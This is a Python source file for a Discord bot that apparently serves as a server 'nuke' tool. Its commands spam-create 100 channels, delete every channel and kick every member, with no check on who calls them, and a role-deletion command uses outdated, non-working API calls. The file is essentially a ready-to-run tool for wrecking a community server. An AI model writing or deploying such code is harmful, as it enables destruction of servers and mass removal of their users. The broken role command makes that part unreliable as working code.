import discord
from discord.ext import commands
from discord.utils import get
intents = discord.Intents.default()
intents.members = True
client = commands.Bot(command_prefix= '.', intents=intents)
x = 100
@client.event
async def on_ready():
    await client.change_presence(activity=discord.Game(name="Yo mama"))
    print('bot is ready')
@client.command()
async def Room(ctx):
    global x
    print("yes")
    for xx in range(x):
        await ctx.guild.create_text_channel('test')

@client.command()
async def RoomD(ctx):
    guild = ctx.guild
    for channel in guild.channels:
        await channel.delete()
@client.command()
async def kickall(ctx, *, reason=None):
    for member in ctx.guild.members:
        try:
            await member.kick(reason=reason)
            print(f"Kicked {member.name}")
        except:
            print(f"Could not kick {member}")
@client.command(pass_context=True)
async def delrole(ctx, *,role_name):
  role = discord.utils.get(ctx.message.server.roles, name=role_name)
  if role:
    try:
      await client.delete_role(ctx.message.server, role)
      await client.say("The role {} has been deleted!".format(role.name))
    except discord.Forbidden:
      await client.say("Missing Permissions to delete this role!")
  else:
    await client.say("The role doesn't exist!")

client.run("KEYHERE")